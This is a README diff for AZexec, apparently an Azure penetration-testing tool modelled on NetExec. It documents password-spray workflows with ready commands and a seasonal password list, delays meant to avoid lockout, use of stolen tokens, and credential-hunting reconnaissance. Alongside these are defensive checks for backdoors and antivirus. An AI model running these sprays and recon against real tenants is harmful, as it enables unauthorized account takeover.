@@ -16,9 +16,11 @@
 
 > **⚡ PASSWORD SPRAY ATTACKS**: AZexec provides a complete password spray workflow using Microsoft's own APIs:
 > 1. **Phase 1** - `users` command: Stealthy username enumeration via GetCredentialType API (no auth logs!)
-> 2. **Phase 2** - `guest` command: ROPC-based credential testing with MFA detection
-> 
-> This two-phase approach is more effective and safer than traditional spraying - only validated usernames are tested, reducing account lockout risk. [See complete workflow →](#password-spray-attack-examples-getcredentialtype--ropc)
+> 2. **Phase 2** - `spray` command: **NEW** NetExec-style password spraying with `-ContinueOnSuccess`, `-NoBruteforce`, `-PasswordFile`, and `-Delay` options
+>
+> The new `spray` command provides NetExec-equivalent functionality: `.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -Delay 1800 -ContinueOnSuccess`
+>
+> This two-phase approach is more effective and safer than traditional spraying - only validated usernames are tested, reducing account lockout risk. [See complete workflow →](#enhanced-password-spraying-with-netexec-style-options)
 
 ---
 
@@ -44,6 +46,12 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 | `nxc smb <target> -u <user> -p <pass> --users`<br>`nxc ldap <target> -u <user> -p <pass> --users` | `.\azx.ps1 user-profiles` | ✅ Required | **Enumerate domain users** (authenticated) |
 | `nxc smb --rid-brute` | `.\azx.ps1 rid-brute` | ✅ Required | **Enumerate users by RID bruteforce** (Azure equivalent) |
 | `nxc smb -u 'a' -p ''` | `.\azx.ps1 guest -Domain example.com -Username user -Password ''` | ❌ None | **Test guest/null login** |
+| `nxc smb <target> -u user -p 'pass'` (shows `Pwn3d!`) | `.\azx.ps1 guest -Domain example.com -Username user -Password 'pass'` | ❌ None | **Credential check with admin detection** - shows `(GlobalAdmin!)` etc. |
+| `nxc smb <target> -u user -H 'hash'` (Pass-the-Hash) | `.\azx.ps1 guest -AccessToken "eyJ0eXAi..."` | ❌ None | **Token auth (Pass-the-Hash equivalent)** - test stolen tokens |
+| `nxc smb -u users.txt -p 'Pass'` | `.\azx.ps1 spray -Domain example.com -UserFile users.txt -Password 'Pass'` | ❌ None | **Password spray attack** (NetExec-style) |
+| `nxc smb -u users.txt -p @pass.txt --no-bruteforce` | `.\azx.ps1 spray ... -PasswordFile pass.txt -NoBruteforce` | ❌ None | **Linear pairing** spray (user1:pass1) |
+| `nxc smb -u users.txt -p 'Pass' --continue-on-success` | `.\azx.ps1 spray ... -ContinueOnSuccess` | ❌ None | **Continue after valid creds** found |
+| `nxc smb -u users.txt -p 'Pass' --local-auth` | `.\azx.ps1 spray ... -LocalAuth` | ❌ None | **Cloud-only** spray (skip federated) |
 | `nxc smb --groups` | `.\azx.ps1 groups` | ✅ Required | Enumerate groups |
 | `nxc smb --local-group` | `.\azx.ps1 local-groups` | ✅ Required | **Enumerate local groups** (Administrative Units) |
 | `nxc smb --pass-pol` | `.\azx.ps1 pass-pol` | ✅ Required | Display password policies |
@@ -64,6 +72,10 @@ For penetration testers familiar with NetExec (formerly CrackMapExec), here's ho
 | `nxc smb --disks` | `.\azx.ps1 disks-enum` | ✅ Required | **Enumerate Azure Managed Disks** (encryption, attachment state) |
 | `nxc smb -M bitlocker` | `.\azx.ps1 bitlocker-enum` | ✅ Required | **Enumerate BitLocker encryption status** (Intune devices + Azure VMs) |
 | `nxc smb -M enum_av` | `.\azx.ps1 av-enum` | ✅ Required | **Enumerate Anti-Virus & EDR products** (security posture assessment) |
+| `nxc smb --tasklist` | `.\azx.ps1 process-enum` | ✅ Required | **Enumerate remote processes** (Windows tasklist / Linux ps aux) |
+| `nxc smb -M lockscreendoors` | `.\azx.ps1 lockscreen-enum` | ✅ Required | **Detect lockscreen backdoors** (accessibility executable hijacking) |
+| `nxc smb -M sccm-recon6` | `.\azx.ps1 intune-enum` | ✅ Required | **Enumerate Intune/Endpoint Manager** (Azure equivalent of SCCM reconnaissance) |
+| `nxc smb --delegate` | `.\azx.ps1 delegation-enum` | ✅ Required | **Enumerate OAuth2 delegation** (impersonation paths via consent grants) |
 
 **Key Difference**: NetExec tests null sessions with `nxc smb -u '' -p ''`. AZexec now has a direct equivalent: `.\azx.ps1 guest -Domain target.com -Username user -Password ''` which tests empty/null password authentication. For post-auth enumeration, use **guest user credentials** which provides similar low-privileged access for reconnaissance. See the [Guest User Enumeration](#-guest-user-enumeration---the-azure-null-session) section for details.
 
@@ -1285,12 +1297,17 @@ All ARM commands share a common multi-subscription enumeration pattern:
   - Export valid usernames for password spray attacks
   - **Enhanced v2.0**: Progress indicators, retry logic, adaptive rate limiting, detailed statistics
 - **Password Spray Attacks**: ROPC-based credential testing (mimics `nxc smb -u users.txt -p 'Pass123'`)
-  - Test single password against multiple users
-  - Support for username:password file format
+  - **NEW: Dedicated `spray` command** with NetExec-style options
+  - Test single or multiple passwords against user lists
+  - `-ContinueOnSuccess`: Keep spraying after finding valid creds (like `--continue-on-success`)
+  - `-NoBruteforce`: Linear pairing mode (user1:pass1, user2:pass2) (like `--no-bruteforce`)
+  - `-PasswordFile`: Load multiple passwords from file (like `-p @file.txt`)
+  - `-Delay`: Configurable delay between password rounds (OPSEC-safe spraying)
   - Automatic lockout detection and account status reporting
   - MFA detection (valid credentials even if MFA blocks)
   - **Two-phase attack**: First enumerate with GetCredentialType, then spray with ROPC
-  - Smart delays to avoid account lockouts
+  - OPSEC warnings display before spray attacks
+  - HTML report export with styled dark theme
 - **Domain User Enumeration**: Comprehensive authenticated user enumeration (mimics `nxc smb/ldap <target> -u <user> -p <pass> --users`)
   - **Azure equivalent of NetExec's SMB/LDAP user enumeration**
   - Enumerate all users in Azure/Entra ID directory with full details
@@ -1806,6 +1823,7 @@ Each command in `azx.ps1` is implemented in a dedicated function file:
 | `roles` | `Roles.ps1` | `Invoke-RoleAssignmentEnumeration` |
 | `ca-policies` | `Policies.ps1` | `Invoke-ConditionalAccessPolicyReview` |
 | `vm-loggedon` | `Sessions.ps1` | `Invoke-VMLoggedOnUsersEnumeration` |
+| `process-enum` | `AzureRM.ps1` | `Invoke-VMProcessEnumeration` |
 | `storage-enum` | `AzureRM.ps1` | `Invoke-StorageEnumeration` |
 | `keyvault-enum` | `AzureRM.ps1` | `Invoke-KeyVaultEnumeration` |
 | `network-enum` | `AzureRM.ps1` | `Invoke-NetworkEnumeration` |
@@ -1828,6 +1846,10 @@ The following commands use Azure Resource Manager API (Az PowerShell modules) in
 | `shares-enum` | Enumerate Azure File Shares (mimics nxc --shares) | Az.Accounts, Az.Resources, Az.Storage | Reader + Storage Account Key Operator or Storage File Data SMB Share Reader |
 | `disks-enum` | Enumerate Azure Managed Disks (mimics nxc --disks) | Az.Accounts, Az.Resources, Az.Compute | Reader (Disk Reader or Contributor for full details) |
 | `bitlocker-enum` | Enumerate BitLocker encryption status on Intune devices + Azure VMs (mimics nxc -M bitlocker) | Microsoft.Graph (Intune) + Az.Accounts, Az.Compute, Az.Resources (VMs) | DeviceManagementManagedDevices.Read.All (Intune) + VM Contributor (Azure VMs) |
+| `process-enum` | Enumerate remote processes on Azure VMs (mimics nxc smb --tasklist) | Az.Accounts, Az.Compute, Az.Resources | VM Contributor or Reader + VM Command Executor |
+| `lockscreen-enum` | Detect lockscreen backdoors on Azure VMs (mimics nxc smb -M lockscreendoors) | Az.Accounts, Az.Compute, Az.Resources | VM Contributor or Reader + VM Command Executor |
+| `intune-enum` | Enumerate Intune/Endpoint Manager configuration (mimics nxc smb -M sccm-recon6) | Microsoft.Graph | DeviceManagementConfiguration.Read.All, DeviceManagementRBAC.Read.All, DeviceManagementManagedDevices.Read.All |
+| `delegation-enum` | Enumerate OAuth2 delegation/impersonation paths (mimics nxc smb --delegate) | Microsoft.Graph | Application.Read.All, Directory.Read.All |
 
 **Multi-Subscription Support**: All ARM commands automatically enumerate all accessible subscriptions. Use `-SubscriptionId` to target a specific subscription, or `-ResourceGroup` to filter within subscriptions.
 
@@ -1872,6 +1894,7 @@ The test script will:
 [*] Testing command: roles ... PASS (Auth Required)
 [*] Testing command: ca-policies ... PASS (Auth Required)
 [*] Testing command: vm-loggedon ... PASS (Auth Required)
+[*] Testing command: process-enum ... PASS (Auth Required)
 [*] Testing command: storage-enum ... PASS (Auth Required)
 [*] Testing command: keyvault-enum ... PASS (Auth Required)
 [*] Testing command: network-enum ... PASS (Auth Required)
@@ -1898,6 +1921,7 @@ sp-discovery    PASS (Auth) 30.21s
 roles           PASS        20.24s
 ca-policies     PASS        5.20s
 vm-loggedon     PASS (Auth) 54.46s
+process-enum    PASS (Auth) 48.32s
 storage-enum    PASS (Auth) 32.15s
 keyvault-enum   PASS (Auth) 28.92s
 network-enum    PASS (Auth) 35.67s
@@ -2179,6 +2203,9 @@ Get-Content spray-results.json | ConvertFrom-Json | Select -ExpandProperty AuthR
 
 # BitLocker enumeration on Windows VMs (multi-subscription support) - Azure authentication required
 .\azx.ps1 bitlocker-enum [-ResourceGroup <RGName>] [-SubscriptionId <SubId>] [-VMFilter <all|running|stopped>] [-ExportPath <Path>]
+
+# Process enumeration on Azure VMs (multi-subscription support) - Azure authentication required
+.\azx.ps1 process-enum [-ResourceGroup <RGName>] [-SubscriptionId <SubId>] [-VMFilter <all|running|stopped>] [-ProcessName <ProcessName>] [-ExportPath <Path>]
 
 # Vulnerable target enumeration (like nxc smb --gen-relay-list) - domain auto-detected if not specified
 .\azx.ps1 vuln-list [-Domain <DomainName>] [-NoColor] [-ExportPath <Path>]
@@ -2979,46 +3006,47 @@ $validExecs | Out-File -FilePath valid-executives.txt
 ```
 
 ### Example 28p: Multi-Password Spray Campaign
-Testing multiple passwords sequentially (with delays to avoid lockouts):
+Testing multiple passwords with built-in delay between rounds (NetExec-style):
 ```powershell
+# Create a password file (one password per line)
+@'
+Summer2024!
+Winter2024!
+Spring2024!
+Fall2024!
+Password123!
+Welcome123!
+TargetCorp2024!
+'@ | Out-File passwords.txt
+
 # Validate usernames first
 .\azx.ps1 users -Domain targetcorp.com -CommonUsernames -ExportPath valid-users.csv
-$validUsers = Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username
-$validUsers | Out-File spray-targets.txt
+Import-Csv valid-users.csv | Where-Object { $_.Exists -eq 'True' } | Select-Object -ExpandProperty Username | Out-File spray-targets.txt
 
-# Password list (seasonal passwords + common patterns)
-$passwords = @(
-    'Summer2024!',
-    'Winter2024!',
-    'Spring2024!',
-    'Fall2024!',
-    'Password123!',
-    'Welcome123!',
-    'TargetCorp2024!'
-)
+# NEW: Use the spray command with built-in delay (30 minutes between password rounds)
+.\azx.ps1 spray -Domain targetcorp.com -UserFile spray-targets.txt -PasswordFile passwords.txt -Delay 1800 -ExportPath spray-results.json
 
-# Spray each password with 30-minute delay between rounds
+# Or continue even after finding valid creds
+.\azx.ps1 spray -Domain targetcorp.com -UserFile spray-targets.txt -PasswordFile passwords.txt -Delay 1800 -ContinueOnSuccess -ExportPath spray-all.json
+
+# Export to HTML for reporting
+.\azx.ps1 spray -Domain targetcorp.com -UserFile spray-targets.txt -PasswordFile passwords.txt -Delay 1800 -ExportPath spray-report.html
+```
+
+**Legacy Method (Manual Loop):**
+```powershell
+# If you prefer the old manual method with more control:
+$passwords = @('Summer2024!', 'Winter2024!', 'Password123!')
+
 foreach ($password in $passwords) {
     Write-Host "`n[*] Testing password: $password"
     .\azx.ps1 guest -Domain targetcorp.com -UserFile spray-targets.txt -Password $password -ExportPath "spray-$password.json"
-    
-    # Wait 30 minutes before next password (avoid account lockouts)
+
     if ($password -ne $passwords[-1]) {
         Write-Host "[*] Waiting 30 minutes before next password spray..."
-        Start-Sleep -Seconds 1800  # 30 minutes
+        Start-Sleep -Seconds 1800
     }
 }
-
-# Consolidate all results
-$allResults = @()
-foreach ($password in $passwords) {
-    $result = Get-Content "spray-$password.json" | ConvertFrom-Json
-    $validCreds = $result.AuthResults | Where-Object { $_.Success -eq $true }
-    $allResults += $validCreds
-}
-
-Write-Host "`n[+] Total valid credentials found: $($allResults.Count)"
-$allResults | Format-Table Username, Password, MFARequired, HasToken
 ```
 
 ### Example 28q: Smart Password Spray - Avoid Known Lockout Thresholds
@@ -3607,8 +3635,8 @@ Enumerate BitLocker encryption status on Intune-managed devices AND Azure VMs:
 [*] SECTION 1: INTUNE-MANAGED DEVICES
 [+] Found 12 Windows devices in Intune
 
-AZR  5905c343-84f7-  443  LS-LPT-05  [*] BitLocker ENABLED | Compliance: compliant
-AZR  b15754a0-0a2b-  443  LS-MCD-01  [*] NOT ENCRYPTED | Compliance: noncompliant
+AZR  5905c343-84f7-  443  T-05  [*] BitLocker ENABLED | Compliance: compliant
+AZR  b15754a0-0a2b-  443  D-01  [*] NOT ENCRYPTED | Compliance: noncompliant
 
 [*] Intune Device Summary:
     Total Windows Devices: 12
@@ -3616,7 +3644,7 @@ AZR  b15754a0-0a2b-  443  LS-MCD-01  [*] NOT ENCRYPTED | Compliance: noncomplian
     NOT Encrypted: 1
 
 [!] Devices without BitLocker:
-    → LS-MCD-01
+    → D-01
 ```
 
 ### Example 34-bitlocker-b: Target Specific Subscription
@@ -3793,16 +3821,16 @@ Find devices with disabled antivirus or firewall:
 
 [*] Security Recommendations:
     [!] 4 devices have DISABLED antivirus - HIGH RISK!
-        → gkarpouzas_AndroidForWork_5/19/2025_5:54 AM
-        → Thanasis's MacBook Pro
-        → samsungSM-S908B
-        → DESKTOP-PBLFO5I
+        → AndroidForWork
+        → MacBook Pro
+        → 908B
+        → FO5I
     [!] 1 Windows devices NOT onboarded to Microsoft Defender for Endpoint
-        → DESKTOP-PBLFO5I
+        → LFO5I
         Consider onboarding to MDE for enhanced threat protection
     [!] 2 Windows devices NOT encrypted (BitLocker)
-        → LS-MCD-01
-        → DESKTOP-PBLFO5I
+        → 01
+        → LFO5I
         Enable BitLocker to protect data at rest
 ```
 
@@ -3850,9 +3878,9 @@ nxc smb 192.168.1.0/24 -u administrator -p 'Password1' -M enum_av
 .\azx.ps1 av-enum
 
 # Output example:
-# AZR  7b67c060-eb92-4  443  LS-LPT-06  [*] AV:Microsoft Defender(enabled) v1.443.147.0 | EDR:Microsoft Defender for Endpoint(enabled) | MDE:Onboarded(healthy) | Encryption:BitLocker Enabled
-# AZR  5b397631-d32c-4  443  DESKTOP-PBLFO5I  [*] AV:Unknown(disabled) | MDE:Not Onboarded
-# AZR  53d543a0-b709-4  443  Thanasis's MacBook Pro  [*] AV:Unknown(disabled) | MDE:Not Onboarded
+# AZR  60-eb92-4  443  T-06  [*] AV:Microsoft Defender(enabled) v1.443.147.0 | EDR:Microsoft Defender for Endpoint(enabled) | MDE:Onboarded(healthy) | Encryption:BitLocker Enabled
+# AZR  31-d32c-4  443  O5I  [*] AV:Unknown(disabled) | MDE:Not Onboarded
+# AZR  a0-b709-4  443  MacBook Pro  [*] AV:Unknown(disabled) | MDE:Not Onboarded
 ```
 
 Both enumerate security products, but AZexec provides additional cloud-native security information:
@@ -3907,6 +3935,475 @@ Both enumerate security products, but AZexec provides additional cloud-native se
 # - Which devices lack security controls (easy targets)
 # - Overall security maturity of the environment
 ```
+
+---
+
+### Process Enumeration: `process-enum`
+
+The Azure equivalent of NetExec's `--tasklist` command. Enumerate running processes on Azure VMs:
+
+```powershell
+# Enumerate all processes on all Azure VMs (like nxc smb --tasklist)
+.\azx.ps1 process-enum
+
+# Filter by process name (like nxc smb --tasklist keepass.exe)
+.\azx.ps1 process-enum -ProcessName "keepass.exe"
+
+# Target specific subscription or resource group
+.\azx.ps1 process-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"
+.\azx.ps1 process-enum -ResourceGroup Production-RG
+
+# Filter by VM power state (default: running only)
+.\azx.ps1 process-enum -VMFilter running
+.\azx.ps1 process-enum -VMFilter all
+
+# Export results to CSV/JSON
+.\azx.ps1 process-enum -ExportPath processes.csv
+.\azx.ps1 process-enum -ExportPath processes.json
+```
+
+**Information Enumerated**:
+- **Process Name** - Executable name (e.g., `notepad.exe`, `python`)
+- **Process ID (PID)** - Unique process identifier
+- **Memory Usage** - Current memory consumption
+- **CPU Usage** - Current CPU percentage (Linux only)
+- **User** - User account running the process
+- **Session** - Session identifier (Windows only)
+- **Command Line** - Full command line arguments (Linux only)
+
+**NetExec Comparison**:
+
+| NetExec Command | AZexec Equivalent | Description |
+|-----------------|-------------------|-------------|
+| `nxc smb 192.168.1.0/24 -u admin -p pass --tasklist` | `.\azx.ps1 process-enum` | Enumerate all processes |
+| `nxc smb 192.168.1.0/24 -u admin -p pass --tasklist keepass.exe` | `.\azx.ps1 process-enum -ProcessName "keepass.exe"` | Filter by process name |
+| NetExec queries via SMB/WMI on remote Windows hosts | AZexec queries via Azure VM Run Command | Cloud vs On-Prem |
+
+**How It Works**:
+- Uses Azure VM Run Command (same as `vm-loggedon` command)
+- Windows VMs: Executes `tasklist` command (equivalent to NetExec's SMB query)
+- Linux VMs: Executes `ps aux` command (process list with details)
+- Requires **Virtual Machine Contributor** or **VM Command Executor** role
+- Queries are logged in Azure Activity Logs (audit trail)
+- Supports both Windows and Linux VMs
+
+**Use Cases**:
+
+| Scenario | Description | Command |
+|----------|-------------|---------|
+| **Credential Hunting** | Find password managers (KeePass, LastPass, etc.) | `.\azx.ps1 process-enum -ProcessName "keepass"` |
+| **Malware Detection** | Identify suspicious processes | `.\azx.ps1 process-enum -ExportPath processes.csv` (analyze in Excel) |
+| **Lateral Movement** | Find processes running as privileged users | Filter CSV for processes with admin users |
+| **Incident Response** | Document running processes during compromise | `.\azx.ps1 process-enum -VMFilter running -ExportPath incident-processes.json` |
+| **Compliance Audit** | Verify approved software only | Compare process list against approved software inventory |
+
+**Example Output**:
+```
+[*] AZX - Remote Process Enumeration
+[*] Command: process-enum (Similar to: nxc smb --tasklist)
+[*] Azure equivalent of NetExec's remote process enumeration
+
+[*] VM: web-server-01
+    Resource Group: Production-RG
+    OS Type: Windows
+    Power State: running
+    [*] Querying processes...
+    [+] Found 45 process(es):
+AZR         web-server-01  443     System                          [*] PID:4 MEM:1,234 K SESSION:Services USER:System
+AZR         web-server-01  443     svchost.exe                     [*] PID:1234 MEM:45,678 K SESSION:Services USER:SYSTEM
+AZR         web-server-01  443     keepass.exe                      [*] PID:5678 MEM:12,345 K SESSION:Console USER:admin
+```
+
+**Troubleshooting**:
+- **"VM is not in running state"**: Process enumeration only works on running VMs. Use `-VMFilter running` to skip stopped VMs.
+- **"AuthorizationFailed"**: Ensure you have `Virtual Machine Contributor` or `VM Command Executor` role assigned.
+- **"No processes found"**: The process name filter may be too restrictive. Try without `-ProcessName` to see all processes.
+
+---
+
+### Lockscreen Backdoor Enumeration: `lockscreen-enum`
+
+The Azure equivalent of NetExec's `-M lockscreendoors` module. Detect when Windows accessibility executables have been replaced with backdoors:
+
+```powershell
+# Detect lockscreen backdoors on all Azure VMs (like nxc smb -M lockscreendoors)
+.\azx.ps1 lockscreen-enum
+
+# Check only running VMs
+.\azx.ps1 lockscreen-enum -VMFilter running
+
+# Target specific subscription or resource group
+.\azx.ps1 lockscreen-enum -SubscriptionId "12345678-1234-1234-1234-123456789012"
+.\azx.ps1 lockscreen-enum -ResourceGroup Production-RG
+
+# Export results to file
+.\azx.ps1 lockscreen-enum -ExportPath lockscreen-report.csv
+.\azx.ps1 lockscreen-enum -ExportPath lockscreen-report.html
+```
+
+**What is a Lockscreen Backdoor?**
+
+Attackers can replace Windows accessibility executables with cmd.exe or powershell.exe to gain SYSTEM access from the lock screen without authentication. These executables can be triggered from the Windows lock screen:
+
+| Executable | Trigger | Description |
+|------------|---------|-------------|
+| `utilman.exe` | Win+U | Ease of Access utility |
+| `sethc.exe` | 5x Shift | Sticky Keys |
+| `narrator.exe` | Win+Enter | Narrator screen reader |
+| `osk.exe` | On-Screen Keyboard button | On-Screen Keyboard |
+| `magnify.exe` | Win++ | Magnifier |
+| `EaseOfAccessDialog.exe` | Ease of Access menu | Ease of Access Dialog |
+| `displayswitch.exe` | Win+P | Display Switch |
+| `atbroker.exe` | Assistive Technology | Assistive Technology Service |
+| `voiceaccess.exe` | Voice commands | Windows Voice Access |
+
+**Detection Logic**:
+- **CLEAN**: FileDescription matches expected accessibility tool name
+- **SUSPICIOUS**: FileDescription differs from expected value (could be legitimate update or modification)
+- **BACKDOORED**: FileDescription is "Windows PowerShell" or "Windows Command Processor" (definite compromise)
+
+**NetExec Comparison**:
+
+| NetExec Command | AZexec Equivalent | Description |
+|-----------------|-------------------|-------------|
+| `nxc smb 192.168.1.0/24 -u admin -p pass -M lockscreendoors` | `.\azx.ps1 lockscreen-enum` | Detect accessibility backdoors |
+| NetExec checks via SMB/WMI on remote Windows hosts | AZexec checks via Azure VM Run Command | Cloud vs On-Prem |
+
+**How It Works**:
+- Uses Azure VM Run Command to execute PowerShell on Windows VMs
+- Reads FileDescription metadata from each accessibility executable using `[System.Diagnostics.FileVersionInfo]`
+- Compares against expected descriptions for accessibility tools
+- Flags executables with cmd.exe or PowerShell descriptions as **BACKDOORED**
+- Windows VMs only (Linux VMs are automatically skipped)
+
+**Example Output**:
+```
+[*] AZX - Lockscreen Backdoor Enumeration
+[*] Command: lockscreen-enum (Similar to: nxc smb -M lockscreendoors)
+[*] Azure equivalent of NetExec's lockscreendoors module
+
+[*] VM: web-server-01
+    Resource Group: Production-RG
+    OS Type: Windows
+    Power State: running
+    [*] Checking accessibility executables...
+AZR         web-server-01  443     utilman.exe                        [+] CLEAN (desc:Utility Manager)
+AZR         web-server-01  443     narrator.exe                       [+] CLEAN (desc:Screen Reader)
+AZR         web-server-01  443     sethc.exe                          [!] BACKDOORED (desc:Windows Command Processor)
+AZR         web-server-01  443     osk.exe                            [+] CLEAN (desc:Accessibility On-Screen Keyboard)
+    [!!!] CRITICAL: 1 BACKDOORED executable(s) detected!
+
+[*] LOCKSCREEN ENUMERATION SUMMARY
+    Total VMs Found: 5
+    Windows VMs Queried: 4
+    Successful Queries: 4
+    BACKDOORED: 1
+    SUSPICIOUS: 0
+    CLEAN: 35
+```
+
+**Use Cases**:
+
+| Scenario | Description | Command |
+|----------|-------------|---------|
+| **Incident Response** | Detect persistence mechanisms | `.\azx.ps1 lockscreen-enum -VMFilter running` |
+| **Security Audit** | Check all VMs for accessibility backdoors | `.\azx.ps1 lockscreen-enum -ExportPath audit.html` |
+| **Compromise Assessment** | Identify potentially compromised systems | `.\azx.ps1 lockscreen-enum -ResourceGroup critical-systems` |
+| **Red Team Validation** | Verify detection capabilities | Check if implanted backdoors are detected |
+
+**Attack Context**:
+1. Attacker gains access to system (e.g., via RDP, physical access, or admin credentials)
+2. Copies cmd.exe to C:\Windows\System32\sethc.exe (or other accessibility executable)
+3. At lock screen, presses Shift 5 times (for sethc.exe) or Win+U (for utilman.exe)
+4. Instead of accessibility feature, a SYSTEM command prompt appears
+5. Attacker has unauthenticated SYSTEM access
+
+**Troubleshooting**:
+- **"VM is not in running state"**: Lockscreen enumeration only works on running VMs. Use `-VMFilter running` to skip stopped VMs.
+- **"AuthorizationFailed"**: Ensure you have `Virtual Machine Contributor` or `VM Command Executor` role assigned.
+- **"Skipping - Lockscreen enumeration is Windows-only"**: Linux VMs don't have Windows accessibility features and are automatically skipped.
+- **"NOT FOUND"**: Some executables may not exist on all Windows versions (e.g., voiceaccess.exe is Windows 11+ only).
+
+---
+
+### Intune/Endpoint Manager Enumeration: `intune-enum`
+
+The Azure equivalent of NetExec's `-M sccm-recon6` module. Enumerate Microsoft Intune/Endpoint Manager infrastructure configuration:
+
+```powershell
+# Enumerate Intune configuration (like nxc smb -M sccm-recon6)
+.\azx.ps1 intune-enum
+
+# Export results to file
+.\azx.ps1 intune-enum -ExportPath intune-report.csv
+.\azx.ps1 intune-enum -ExportPath intune-report.json
+.\azx.ps1 intune-enum -ExportPath intune-report.html
+```
+
+**What is SCCM vs Intune?**
+
+SCCM (System Center Configuration Manager) is Microsoft's on-premises endpoint management solution. In Azure/cloud environments, SCCM has been replaced by **Microsoft Intune** (part of Microsoft Endpoint Manager). This command provides the cloud equivalent of SCCM reconnaissance.
+
+**NetExec sccm-recon6 vs AZexec intune-enum:**
+
+| Aspect | On-Premises (NetExec sccm-recon6) | Azure (AZexec intune-enum) |
+|--------|-----------------------------------|----------------------------|
+| **Command** | `nxc smb <target> -u User -p Pass -M sccm-recon6` | `.\azx.ps1 intune-enum` |
+| **Protocol** | SMB/Registry (port 445) | Microsoft Graph API (HTTPS/443) |
+| **Target** | SCCM Primary Site Server | Microsoft Intune tenant |
+| **Data Source** | `HKLM\SOFTWARE\Microsoft\SMS` registry | Graph `/deviceManagement/*` endpoints |
+| **Infrastructure** | Distribution Points, Management Points | Enrollment configs, Compliance policies |
+| **Role Info** | Site server roles | Intune RBAC role definitions & assignments |
+| **Deployment** | PXE boot, Task Sequences | Autopilot profiles, Configuration profiles |
+
+**What intune-enum Enumerates:**
+
+| Category | SCCM Equivalent | Description |
+|----------|-----------------|-------------|
+| **Enrollment Configurations** | Distribution Points | Device enrollment limits, platform restrictions |
+| **Compliance Policies** | Management Point security policies | Required security settings per platform |
+| **Configuration Profiles** | Task Sequences | WiFi, VPN, certificates, custom configs |
+| **RBAC Role Definitions** | Site Admin Roles | Built-in and custom Intune admin roles |
+| **Role Assignments** | Role Memberships | Who has what Intune permissions |
+| **Autopilot Profiles** | PXE Boot / OS Deployment | Windows device provisioning settings |
+| **Managed Device Summary** | Site Status | Total enrolled devices by platform |
+
+**Required Permissions:**
+
+```
+DeviceManagementConfiguration.Read.All  - Read device configurations and policies
+DeviceManagementRBAC.Read.All           - Read Intune role assignments
+DeviceManagementManagedDevices.Read.All - Read managed device info
+```
+
+**Example Output:**
+```
+[*] AZX - Intune/Endpoint Manager Enumeration
+[*] Command: intune-enum (Similar to: nxc smb -M sccm-recon6)
+[*] Azure equivalent of NetExec's SCCM reconnaissance
+
+[*] ========================================
+[*] ENROLLMENT CONFIGURATION
+[*] ========================================
+
+AZR         INTUNE          443    Windows Enrollment                 [*] Type: Enrollment Limit | Limit: 15 devices
+AZR         INTUNE          443    iOS Enrollment                     [*] Type: Platform Restrictions
+AZR         INTUNE          443    Android Enrollment                 [!] HIGH LIMIT - Type: Enrollment Limit | Limit: 50 devices
+
+[*] ========================================
+[*] COMPLIANCE POLICIES
+[*] ========================================
+
+AZR         INTUNE          443    Windows-Security-Baseline          [*] Platform: Windows 10/11 | BitLocker:Required | Firewall:Required
+AZR         INTUNE          443    iOS-Corporate-Policy               [*] Platform: iOS/iPadOS | Password:Required | MinLen:6
+AZR         INTUNE          443    Android-Basic-Policy               [!] NO SECURITY REQUIREMENTS - Platform: Android
+
+[*] ========================================
+[*] INTUNE RBAC ROLES
+[*] ========================================
+
+AZR         INTUNE          443    Intune Administrator               [!] HIGH PRIV - Full Intune access
+AZR         INTUNE          443    Help Desk Operator                 [*] Built-in | Permissions: 45
+AZR         INTUNE          443    Custom Device Admin                [*] Custom | Permissions: 23
+
+[*] ========================================
+[*] CONFIGURATION PROFILES
+[*] ========================================
+
+AZR         INTUNE          443    Corporate-WiFi                     [!] SENSITIVE - WiFi
+AZR         INTUNE          443    VPN-AlwaysOn                       [!] SENSITIVE - VPN
+AZR         INTUNE          443    Certificate-SCEP                   [!] SENSITIVE - Certificate
+AZR         INTUNE          443    Windows-Baseline                   [*] Type: Windows General
+
+[*] ========================================
+[*] AUTOPILOT PROFILES
+[*] ========================================
+
+AZR         INTUNE          443    Standard-Deployment                [*] Mode: User-Driven | OOBE: SkipEULA | SkipPrivacy
+AZR         INTUNE          443    Kiosk-Deployment                   [!] LOCAL ADMIN - Mode: Self-Deploying | OOBE: LocalAdmin
+
+[*] ========================================
+[*] MANAGED DEVICES SUMMARY
+[*] ========================================
+
+    Total Enrolled Devices: 1,234
+    Windows Devices: 892
+    iOS/iPadOS Devices: 256
+    Android Devices: 78
+    macOS Devices: 8
+```
+
+**Security Analysis Features:**
+
+| Check | Risk Level | Description |
+|-------|------------|-------------|
+| High Enrollment Limits | MEDIUM | Device limits >10 may indicate weak controls |
+| No Security Requirements | HIGH | Compliance policies without security settings |
+| High Privilege Roles | HIGH | Roles with full Intune admin access |
+| Sensitive Config Profiles | INFO | VPN, WiFi, Certificate profiles (credential exposure risk) |
+| Local Admin Autopilot | MEDIUM | Autopilot profiles granting local admin rights |
+
+**Use Cases:**
+
+| Scenario | Description | Command |
+|----------|-------------|---------|
+| **Security Audit** | Review Intune configuration posture | `.\azx.ps1 intune-enum -ExportPath audit.html` |
+| **Penetration Testing** | Identify weak policies and high-priv roles | `.\azx.ps1 intune-enum` |
+| **Compliance Check** | Verify security requirements are enforced | `.\azx.ps1 intune-enum -ExportPath compliance.csv` |
+| **Attack Surface Analysis** | Identify sensitive configuration profiles | Review exported data for VPN/WiFi/Cert profiles |
+
+**Attack Context:**
+1. Enumerate Intune configuration to understand device management posture
+2. Identify compliance policies without security requirements (potential bypass)
+3. Find high-privilege role assignments (privilege escalation targets)
+4. Locate sensitive configuration profiles (credential harvesting opportunity)
+5. Analyze Autopilot profiles for local admin grants (initial access vector)
+
+**Troubleshooting**:
+- **"Failed to retrieve enrollment configurations"**: Ensure you have `DeviceManagementConfiguration.Read.All` permission.
+- **"Failed to retrieve role definitions"**: Ensure you have `DeviceManagementRBAC.Read.All` permission.
+- **"No managed device data available"**: Ensure you have `DeviceManagementManagedDevices.Read.All` permission or devices are enrolled in Intune.
+
+---
+
+### OAuth2 Delegation Enumeration: `delegation-enum`
+
+The Azure equivalent of NetExec's `--delegate` flag. Enumerate OAuth2 consent grants to identify applications that can act on behalf of users (impersonation paths).
+
+```powershell
+# Enumerate OAuth2 delegation (like nxc smb --delegate)
+.\azx.ps1 delegation-enum
+
+# Export results to file
+.\azx.ps1 delegation-enum -ExportPath delegation.csv
+.\azx.ps1 delegation-enum -ExportPath delegation.json
